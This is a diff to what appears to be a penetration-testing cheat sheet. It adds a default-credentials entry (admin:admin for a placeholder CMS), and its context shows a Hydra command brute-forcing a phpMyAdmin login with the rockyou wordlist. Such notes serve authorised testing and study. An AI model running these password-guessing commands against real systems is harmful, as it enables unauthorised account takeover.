@@ -222,6 +222,12 @@ NSTR
 
 # Exploit
 ## Password Guessing
+### Default Credentials
+```bash
+# CMS Web App 9000
+# admin:admin
+```
+
 ### Hydra
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
